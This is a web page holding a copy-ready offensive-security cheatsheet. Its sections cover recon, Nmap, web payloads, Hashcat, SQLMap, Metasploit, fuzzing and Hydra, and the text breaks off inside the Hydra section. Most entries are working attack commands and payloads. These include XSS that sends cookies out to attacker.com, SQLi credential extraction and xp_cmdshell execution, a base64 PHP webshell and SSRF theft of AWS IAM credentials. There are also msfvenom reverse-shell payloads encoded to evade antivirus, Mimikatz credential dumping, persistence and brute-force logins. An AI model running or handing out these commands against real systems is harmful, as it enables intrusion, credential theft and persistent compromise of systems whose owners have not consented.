---
layout: page
title: Cheatsheet
permalink: /cheatsheet/
---

<style>
  .cs-page { font-family: 'Courier New', monospace; max-width: 960px; margin: 0 auto; }
  .cs-hero { border: 1px solid #00ff4133; border-radius: 8px; background: #050f05; padding: 1.2rem 1.4rem; margin-bottom: 1.2rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
  .cs-hero-title { font-size: 1.3rem; font-weight: 900; color: #00ff41; letter-spacing: 2px; text-transform: uppercase; }
  .cs-hero-sub { font-size: 11px; color: #4a7a4a; margin-top: 3px; }
  .cs-hero-stats { display: flex; gap: 1.5rem; }
  .cs-stat { text-align: center; }
  .cs-stat-num { font-size: 1.4rem; font-weight: 700; color: #00ff41; line-height: 1; }
  .cs-stat-lbl { font-size: 10px; color: #4a7a4a; letter-spacing: 1px; }
  .cs-search { width: 100%; background: #050f05; border: 1px solid #00ff4133; border-radius: 6px; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 10px 14px; outline: none; margin-bottom: 1rem; letter-spacing: 0.5px; box-sizing: border-box; }
  .cs-search:focus { border-color: #00ff41; }
  .cs-search::placeholder { color: #4a7a4a; }
  .level-row { display: flex; gap: 8px; margin-bottom: 1rem; flex-wrap: wrap; }
  .level-btn { font-family: 'Courier New', monospace; font-size: 11px; letter-spacing: 1px; padding: 4px 14px; border-radius: 3px; cursor: pointer; border: 1px solid; transition: all 0.15s; text-transform: uppercase; background: transparent; }
  .level-btn.all { border-color: #00ff4155; color: #4a7a4a; }
  .level-btn.all.on { background: #00ff41; color: #000; border-color: #00ff41; }
  .level-btn.beginner { border-color: #00cc3355; color: #00cc33; }
  .level-btn.beginner.on { background: #00cc33; color: #000; }
  .level-btn.intermediate { border-color: #ffb30055; color: #ffb300; }
  .level-btn.intermediate.on { background: #ffb300; color: #000; }
  .level-btn.advanced { border-color: #ff004055; color: #ff6060; }
  .level-btn.advanced.on { background: #ff0040; color: #fff; border-color: #ff0040; }
  .cs-tabs { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 1.2rem; }
  .cs-tab { background: #0a1a0a; border: 1px solid #00ff4133; color: #4a7a4a; padding: 5px 12px; border-radius: 4px; cursor: pointer; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; transition: all 0.15s; font-family: 'Courier New', monospace; }
  .cs-tab:hover { border-color: #00ff41; color: #00ff41; }
  .cs-tab.on { background: #00ff41; color: #000; border-color: #00ff41; font-weight: 700; }
  .cs-section { display: none; }
  .cs-section.on { display: block; }
  .cs-tool-header { margin-bottom: 1rem; }
  .cs-tool-title { font-size: 1.6rem; font-weight: 900; color: #00ff41; letter-spacing: 2px; text-transform: uppercase; }
  .cs-tool-desc { font-size: 12px; color: #4a7a4a; margin-top: 2px; }
  .cs-block { background: #050f05; border: 1px solid #00ff4122; border-radius: 6px; margin-bottom: 1.2rem; overflow: hidden; }
  .cs-block-hdr { background: #0a1a0a; border-bottom: 1px solid #00ff4122; padding: 7px 14px; font-size: 10px; color: #4a7a4a; letter-spacing: 2px; text-transform: uppercase; }
  .cs-block-hdr::before { content: "// "; color: #00ff4155; }
  .cs-cmd-list { padding: 0.5rem 0; }
  .cs-cmd { display: flex; flex-direction: column; padding: 0.55rem 0.9rem; border-left: 3px solid #00ff41; margin: 0 0.7rem 0.5rem; background: #0a1a0a; border-radius: 0 4px 4px 0; position: relative; transition: background 0.15s; }
  .cs-cmd:hover { background: #0f240f; }
  .cs-cmd:last-child { margin-bottom: 0.2rem; }
  .cs-cmd.b { border-left-color: #00cc33; }
  .cs-cmd.m { border-left-color: #ffb300; }
  .cs-cmd.a { border-left-color: #ff0040; }
  .cs-cmd.hide { display: none; }
  .ct { font-family: 'Courier New', monospace; font-size: 12px; font-weight: 700; word-break: break-all; padding-right: 52px; color: #00ff41; }
  .cs-cmd.b .ct { color: #00cc33; }
  .cs-cmd.m .ct { color: #ffb300; }
  .cs-cmd.a .ct { color: #ff6060; }
  .cd { font-size: 11px; color: #888; margin-top: 3px; }
  .cp { position: absolute; right: 7px; top: 50%; transform: translateY(-50%); background: transparent; border: 1px solid #00ff4133; color: #4a7a4a; font-size: 9px; padding: 2px 7px; border-radius: 2px; cursor: pointer; font-family: 'Courier New', monospace; transition: all 0.15s; }
  .cp:hover { border-color: #00ff41; color: #00ff41; }
  .cp.ok { border-color: #00ff41; color: #00ff41; background: #071a11; }
  .cs-count { font-size: 11px; color: #4a7a4a; margin-bottom: 1rem; }
  .cs-count span { color: #00ff41; font-weight: 700; }
  .leg { display: flex; gap: 14px; font-size: 11px; margin-bottom: 1rem; flex-wrap: wrap; }
  .leg-i { display: flex; align-items: center; gap: 5px; color: #4a7a4a; }
  .leg-d { width: 12px; height: 3px; border-radius: 1px; display: inline-block; }
</style>

<div class="cs-page">

<div class="cs-hero">
  <div>
    <div class="cs-hero-title">Security Cheatsheet</div>
    <div class="cs-hero-sub">Beginner → Intermediate → Advanced · Copy any command instantly</div>
  </div>
  <div class="cs-hero-stats">
    <div class="cs-stat"><div class="cs-stat-num">15</div><div class="cs-stat-lbl">Tools</div></div>
    <div class="cs-stat"><div class="cs-stat-num">200+</div><div class="cs-stat-lbl">Commands</div></div>
    <div class="cs-stat"><div class="cs-stat-num">3</div><div class="cs-stat-lbl">Levels</div></div>
  </div>
</div>

<input class="cs-search" id="cs-search" type="text" placeholder="$ search commands, tools, techniques..." oninput="filterAll(this.value)">

<div class="level-row">
  <button class="level-btn all on" onclick="setLevel('all',this)">All Levels</button>
  <button class="level-btn beginner" onclick="setLevel('b',this)">🟢 Beginner</button>
  <button class="level-btn intermediate" onclick="setLevel('m',this)">🟡 Intermediate</button>
  <button class="level-btn advanced" onclick="setLevel('a',this)">🔴 Advanced</button>
</div>

<div class="leg">
  <div class="leg-i"><span class="leg-d" style="background:#00cc33"></span> Beginner</div>
  <div class="leg-i"><span class="leg-d" style="background:#ffb300"></span> Intermediate</div>
  <div class="leg-i"><span class="leg-d" style="background:#ff0040"></span> Advanced</div>
</div>

<div class="cs-tabs" id="tabs">
  <div class="cs-tab on" onclick="showTool('recon',this)">Recon</div>
  <div class="cs-tab" onclick="showTool('nmap',this)">Nmap</div>
  <div class="cs-tab" onclick="showTool('web',this)">Web</div>
  <div class="cs-tab" onclick="showTool('hashcat',this)">Hashcat</div>
  <div class="cs-tab" onclick="showTool('sqlmap',this)">SQLMap</div>
  <div class="cs-tab" onclick="showTool('msf',this)">Metasploit</div>
  <div class="cs-tab" onclick="showTool('fuzz',this)">Gobuster/FFUF</div>
  <div class="cs-tab" onclick="showTool('hydra',this)">Hydra</div>
  <div class="cs-tab" onclick="showTool('privesc',this)">Linux Privesc</div>
  <div class="cs-tab" onclick="showTool('winad',this)">Windows AD</div>
  <div class="cs-tab" onclick="showTool('forensics',this)">Forensics</div>
  <div class="cs-tab" onclick="showTool('osint',this)">OSINT</div>
  <div class="cs-tab" onclick="showTool('cloud',this)">Cloud</div>
  <div class="cs-tab" onclick="showTool('shells',this)">Rev Shells</div>
  <div class="cs-tab" onclick="showTool('misc',this)">Misc</div>
</div>

<div class="cs-count" id="cs-count"></div>

<!-- RECON -->
<div class="cs-section on" id="tool-recon">
<div class="cs-tool-header"><div class="cs-tool-title">🔎 Reconnaissance</div><div class="cs-tool-desc">Passive and active info gathering before you touch the target</div></div>
<div class="cs-block"><div class="cs-block-hdr">Passive DNS</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">whois target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Domain registration, registrar, owner details</div></div>
  <div class="cs-cmd b"><div class="ct">dig target.com ANY<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Query all DNS record types</div></div>
  <div class="cs-cmd b"><div class="ct">nslookup -type=MX target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find mail servers for the domain</div></div>
  <div class="cs-cmd m"><div class="ct">dig axfr @ns1.target.com target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">DNS zone transfer — dumps all records if misconfigured</div></div>
  <div class="cs-cmd m"><div class="ct">subfinder -d target.com -o subs.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Passive subdomain discovery using multiple OSINT sources</div></div>
  <div class="cs-cmd m"><div class="ct">dnsrecon -d target.com -t std,brt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Comprehensive DNS enumeration and brute force</div></div>
  <div class="cs-cmd a"><div class="ct">amass enum -passive -d target.com -o amass.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Deep passive subdomain enumeration via AMASS</div></div>
  <div class="cs-cmd a"><div class="ct">massdns -r resolvers.txt -t A -o S domains.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Resolve millions of subdomains rapidly with massdns</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Google Dorks</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">site:target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">All indexed pages of a domain</div></div>
  <div class="cs-cmd b"><div class="ct">site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find exposed documents</div></div>
  <div class="cs-cmd m"><div class="ct">site:target.com inurl:admin OR inurl:login OR inurl:dashboard<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find admin portals and login pages</div></div>
  <div class="cs-cmd m"><div class="ct">intitle:"index of" site:target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find open directory listings</div></div>
  <div class="cs-cmd m"><div class="ct">site:target.com ext:php inurl:?id=<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PHP pages with GET parameters — potential SQLi</div></div>
  <div class="cs-cmd a"><div class="ct">site:target.com filetype:env OR filetype:log OR filetype:bak<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Hunt exposed config and backup files</div></div>
  <div class="cs-cmd a"><div class="ct">"@target.com" site:pastebin.com OR site:github.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Find leaked credentials mentioning the domain</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Active Recon</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">whatweb target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Fingerprint CMS, frameworks, web server technology</div></div>
  <div class="cs-cmd b"><div class="ct">nikto -h http://target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Web server vulnerability scanner — misconfigs and CVEs</div></div>
  <div class="cs-cmd m"><div class="ct">wafw00f http://target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Detect Web Application Firewall (WAF) in use</div></div>
  <div class="cs-cmd a"><div class="ct">shodan search "org:\"target company\"" --fields ip_str,port,hostnames<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Map internet-exposed assets via Shodan</div></div>
  <div class="cs-cmd a"><div class="ct">nuclei -u http://target.com -t cves/ -t exposures/<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Fast CVE and exposure scanning with Nuclei templates</div></div>
</div></div>
</div>

<!-- NMAP -->
<div class="cs-section" id="tool-nmap">
<div class="cs-tool-header"><div class="cs-tool-title">🔍 Nmap</div><div class="cs-tool-desc">Network mapper — port scanning, service detection, scripting engine</div></div>
<div class="cs-block"><div class="cs-block-hdr">Host Discovery</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">nmap -sn 192.168.1.0/24<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Ping sweep — find live hosts on subnet</div></div>
  <div class="cs-cmd b"><div class="ct">nmap -Pn 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Skip ping — treat host as alive, bypass ICMP blocks</div></div>
  <div class="cs-cmd m"><div class="ct">nmap -sn --traceroute 192.168.1.0/24<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Ping sweep with network path tracing</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Port Scanning</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">nmap 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Default scan — top 1000 ports</div></div>
  <div class="cs-cmd b"><div class="ct">nmap -p 22,80,443,3389 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Scan specific ports</div></div>
  <div class="cs-cmd m"><div class="ct">nmap -p- -T4 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">All 65535 ports — fast timing</div></div>
  <div class="cs-cmd m"><div class="ct">nmap -sS -sV -sC -O -p- 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Full stealth scan — service, scripts, OS detection</div></div>
  <div class="cs-cmd m"><div class="ct">nmap -sU --top-ports 200 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Top 200 UDP ports — DNS, SNMP, TFTP</div></div>
  <div class="cs-cmd a"><div class="ct">nmap -sS -T1 --scan-delay 5s -D RND:10 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Slow stealth scan with 10 random decoys — evade IDS</div></div>
  <div class="cs-cmd a"><div class="ct">nmap -sI zombie_host 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Idle/zombie scan — completely anonymous scan</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">NSE Scripts</div><div class="cs-cmd-list">
  <div class="cs-cmd m"><div class="ct">nmap --script vuln 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Run all vulnerability detection scripts</div></div>
  <div class="cs-cmd m"><div class="ct">nmap --script smb-vuln-ms17-010 -p 445 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Check EternalBlue MS17-010</div></div>
  <div class="cs-cmd m"><div class="ct">nmap --script http-enum -p 80 target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Enumerate web directories and files</div></div>
  <div class="cs-cmd a"><div class="ct">nmap --script ssl-enum-ciphers -p 443 target.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Enumerate SSL/TLS ciphers — find weak encryption</div></div>
  <div class="cs-cmd a"><div class="ct">nmap --script=brute -p 22,21,3306 192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Run brute force scripts on common services</div></div>
</div></div>
</div>

<!-- WEB -->
<div class="cs-section" id="tool-web">
<div class="cs-tool-header"><div class="cs-tool-title">🕸️ Web Application</div><div class="cs-tool-desc">XSS, SQLi, SSRF, LFI, IDOR — web attack payloads and techniques</div></div>
<div class="cs-block"><div class="cs-block-hdr">XSS Payloads</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">&lt;script&gt;alert(1)&lt;/script&gt;<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic reflected XSS test</div></div>
  <div class="cs-cmd b"><div class="ct">&lt;img src=x onerror=alert(document.domain)&gt;<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">XSS via broken image onerror event</div></div>
  <div class="cs-cmd m"><div class="ct">&lt;svg onload=alert(document.cookie)&gt;<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">SVG-based XSS to steal cookies</div></div>
  <div class="cs-cmd m"><div class="ct">javascript:alert(document.domain)<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">JS URI XSS — works in href attributes</div></div>
  <div class="cs-cmd a"><div class="ct">&lt;img src=x onerror="fetch('https://attacker.com/x?c='+btoa(document.cookie))"&gt;<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Cookie exfiltration to attacker server via XSS</div></div>
  <div class="cs-cmd a"><div class="ct">"&gt;&lt;script src="https://attacker.com/xss.js"&gt;&lt;/script&gt;<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Load external JS payload for advanced XSS attack</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">SQL Injection</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">' OR 1=1--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Classic auth bypass — always true condition</div></div>
  <div class="cs-cmd b"><div class="ct">admin'--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Bypass login — comment out password check</div></div>
  <div class="cs-cmd m"><div class="ct">' UNION SELECT null,username,password FROM users--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">UNION-based SQLi — extract credentials</div></div>
  <div class="cs-cmd m"><div class="ct">1' AND SLEEP(5)--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Time-based blind SQLi — 5s delay confirms vuln</div></div>
  <div class="cs-cmd a"><div class="ct">'; EXEC xp_cmdshell('whoami')--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">MSSQL RCE via xp_cmdshell</div></div>
  <div class="cs-cmd a"><div class="ct">' AND (SELECT LOAD_FILE('/etc/passwd'))--<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">MySQL file read — requires FILE privilege</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">LFI / Path Traversal</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">../../../etc/passwd<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic path traversal to read /etc/passwd</div></div>
  <div class="cs-cmd m"><div class="ct">....//....//....//etc/passwd<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Double slash bypass for traversal filters</div></div>
  <div class="cs-cmd m"><div class="ct">/proc/self/environ<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Read env vars — may contain secrets and tokens</div></div>
  <div class="cs-cmd a"><div class="ct">php://filter/convert.base64-encode/resource=index.php<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PHP wrapper — read source code as base64</div></div>
  <div class="cs-cmd a"><div class="ct">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">PHP data wrapper RCE — injects webshell via LFI</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">SSRF</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">http://127.0.0.1/admin<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic SSRF — access internal admin interface</div></div>
  <div class="cs-cmd m"><div class="ct">http://169.254.169.254/latest/meta-data/iam/security-credentials/<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">AWS metadata — steal IAM credentials via SSRF</div></div>
  <div class="cs-cmd a"><div class="ct">dict://127.0.0.1:6379/INFO<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">SSRF to internal Redis via dict protocol</div></div>
  <div class="cs-cmd a"><div class="ct">gopher://127.0.0.1:25/_MAIL FROM:attacker@x.com<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Gopher SSRF to reach internal SMTP server</div></div>
</div></div>
</div>

<!-- HASHCAT -->
<div class="cs-section" id="tool-hashcat">
<div class="cs-tool-header"><div class="cs-tool-title">🔑 Hashcat</div><div class="cs-tool-desc">GPU-accelerated password cracking — dictionary, brute force, hybrid</div></div>
<div class="cs-block"><div class="cs-block-hdr">Dictionary Attacks</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">hashcat -a 0 -m 0 hashes.txt rockyou.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Dictionary attack on MD5 hashes</div></div>
  <div class="cs-cmd b"><div class="ct">hashcat -a 0 -m 1000 hashes.txt rockyou.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Crack NTLM Windows password hashes</div></div>
  <div class="cs-cmd b"><div class="ct">hashcat hashes.txt --show<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Show already cracked hashes</div></div>
  <div class="cs-cmd m"><div class="ct">hashcat -a 0 -m 0 hashes.txt rockyou.txt -r rules/best64.rule<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Apply best64 rules for more combinations</div></div>
  <div class="cs-cmd m"><div class="ct">hashcat -a 0 -m 1800 hashes.txt rockyou.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Crack Linux SHA-512 shadow hashes</div></div>
  <div class="cs-cmd m"><div class="ct">hashcat -a 0 -m 3200 hashes.txt rockyou.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Crack bcrypt hashes — slow but thorough</div></div>
  <div class="cs-cmd a"><div class="ct">hashcat -a 0 -m 13100 hashes.txt rockyou.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Kerberoast TGS hashes from Active Directory</div></div>
  <div class="cs-cmd a"><div class="ct">hashcat -a 6 -m 0 hashes.txt wordlist.txt ?d?d?d?d<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Hybrid attack — wordlist + 4-digit suffix mask</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Brute Force Masks</div><div class="cs-cmd-list">
  <div class="cs-cmd m"><div class="ct">hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute-force 6-digit PIN</div></div>
  <div class="cs-cmd m"><div class="ct">hashcat -a 3 -m 0 hashes.txt ?u?l?l?l?d?d?d?s<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Mask: 1 upper + 3 lower + 3 digits + 1 special</div></div>
  <div class="cs-cmd a"><div class="ct">hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a --increment --increment-min 6<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Incremental brute force 6–8 chars all charsets</div></div>
</div></div>
</div>

<!-- SQLMAP -->
<div class="cs-section" id="tool-sqlmap">
<div class="cs-tool-header"><div class="cs-tool-title">💉 SQLMap</div><div class="cs-tool-desc">Automatic SQL injection detection and exploitation</div></div>
<div class="cs-block"><div class="cs-block-hdr">Detection and Extraction</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">sqlmap -u "http://target.com/page?id=1" --dbs<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Detect SQLi and enumerate databases</div></div>
  <div class="cs-cmd b"><div class="ct">sqlmap -u "http://target.com/page?id=1" -D db -T users --dump<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Dump entire users table</div></div>
  <div class="cs-cmd b"><div class="ct">sqlmap -u "http://target.com/?id=1" --current-user --current-db --hostname<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Get DB user, database name and server hostname</div></div>
  <div class="cs-cmd m"><div class="ct">sqlmap -r request.txt --level=3 --risk=2 --batch<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Use saved Burp request — elevated aggressiveness</div></div>
  <div class="cs-cmd m"><div class="ct">sqlmap -u "http://target.com/?id=1" --tamper=space2comment,charencode<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Chain tamper scripts to bypass WAF</div></div>
  <div class="cs-cmd a"><div class="ct">sqlmap -u "http://target.com/?id=1" --os-shell<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Get OS shell via SQLi file write</div></div>
  <div class="cs-cmd a"><div class="ct">sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd" --file-write="shell.php" --file-dest="/var/www/html/shell.php"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Read system files and write webshell via SQLi</div></div>
</div></div>
</div>

<!-- METASPLOIT -->
<div class="cs-section" id="tool-msf">
<div class="cs-tool-header"><div class="cs-tool-title">💀 Metasploit</div><div class="cs-tool-desc">Exploitation framework — exploits, payloads, post-exploitation</div></div>
<div class="cs-block"><div class="cs-block-hdr">Core Commands</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">msfconsole<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Launch Metasploit Framework console</div></div>
  <div class="cs-cmd b"><div class="ct">search type:exploit platform:windows smb<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Search for Windows SMB exploits</div></div>
  <div class="cs-cmd b"><div class="ct">use exploit/windows/smb/ms17_010_eternalblue<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Load EternalBlue exploit</div></div>
  <div class="cs-cmd m"><div class="ct">use auxiliary/scanner/smb/smb_ms17_010 && set RHOSTS 192.168.1.0/24 && run<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Scan whole subnet for EternalBlue vulnerable hosts</div></div>
  <div class="cs-cmd m"><div class="ct">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell.exe<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Generate Windows reverse shell payload</div></div>
  <div class="cs-cmd a"><div class="ct">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -e x64/xor -i 5 -o shell.elf<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Encoded Linux payload — 5 XOR iterations for AV evasion</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">Meterpreter Post-Exploitation</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">sysinfo && getuid<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Get system info and current user</div></div>
  <div class="cs-cmd m"><div class="ct">getsystem && hashdump<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Escalate to SYSTEM and dump all password hashes</div></div>
  <div class="cs-cmd m"><div class="ct">run post/multi/recon/local_exploit_suggester<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Suggest local privilege escalation exploits</div></div>
  <div class="cs-cmd a"><div class="ct">load kiwi && creds_all<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Load Mimikatz (kiwi) and dump all credentials</div></div>
  <div class="cs-cmd a"><div class="ct">run post/windows/manage/persistence_exe STARTUP=SCHEDULER<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Persist access via Windows Task Scheduler</div></div>
</div></div>
</div>

<!-- GOBUSTER/FFUF -->
<div class="cs-section" id="tool-fuzz">
<div class="cs-tool-header"><div class="cs-tool-title">🚀 Gobuster / FFUF</div><div class="cs-tool-desc">Directory, file, subdomain and parameter fuzzing</div></div>
<div class="cs-block"><div class="cs-block-hdr">Gobuster</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic directory brute force</div></div>
  <div class="cs-cmd m"><div class="ct">gobuster dir -u http://target.com -w raft-large-words.txt -x php,html,txt,bak -t 50<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Fuzz extensions with 50 threads</div></div>
  <div class="cs-cmd m"><div class="ct">gobuster dns -d target.com -w subdomains-top1million.txt -t 50<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Subdomain brute force via DNS</div></div>
  <div class="cs-cmd a"><div class="ct">gobuster vhost -u http://target.com -w subdomains.txt --append-domain<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Virtual host discovery — find hidden subdomains</div></div>
</div></div>
<div class="cs-block"><div class="cs-block-hdr">FFUF</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">ffuf -u http://target.com/FUZZ -w wordlist.txt<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Basic directory fuzzing</div></div>
  <div class="cs-cmd m"><div class="ct">ffuf -u http://target.com/?FUZZ=value -w params.txt -mc 200<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Fuzz GET parameter names — show only 200 responses</div></div>
  <div class="cs-cmd m"><div class="ct">ffuf -u http://FUZZ.target.com -w subdomains.txt -mc 200,301,302<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Subdomain fuzzing with FFUF</div></div>
  <div class="cs-cmd a"><div class="ct">ffuf -u http://target.com/api/FUZZ -w api-endpoints.txt -H "Authorization: Bearer TOKEN" -mc all -fc 404,403 -replay-proxy http://127.0.0.1:8080<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Authenticated API fuzzing through Burp proxy</div></div>
</div></div>
</div>

<!-- HYDRA -->
<div class="cs-section" id="tool-hydra">
<div class="cs-tool-header"><div class="cs-tool-title">🐉 Hydra</div><div class="cs-tool-desc">Online password brute-forcing — SSH, FTP, HTTP, RDP and more</div></div>
<div class="cs-block"><div class="cs-block-hdr">Service Attacks</div><div class="cs-cmd-list">
  <div class="cs-cmd b"><div class="ct">hydra -l admin -P rockyou.txt ssh://192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute force SSH login</div></div>
  <div class="cs-cmd b"><div class="ct">hydra -L users.txt -P rockyou.txt ftp://192.168.1.1<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute force FTP with user and password lists</div></div>
  <div class="cs-cmd b"><div class="ct">hydra -l admin -P rockyou.txt 192.168.1.1 mysql<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute force MySQL database login</div></div>
  <div class="cs-cmd m"><div class="ct">hydra -l admin -P rockyou.txt 192.168.1.1 rdp -t 4<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute force RDP — low threads to avoid lockout</div></div>
  <div class="cs-cmd m"><div class="ct">hydra -L users.txt -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"<button class="cp" onclick="doCopy(this)">copy</button></div><div class="cd">Brute force HTTP POST login form</div></div>
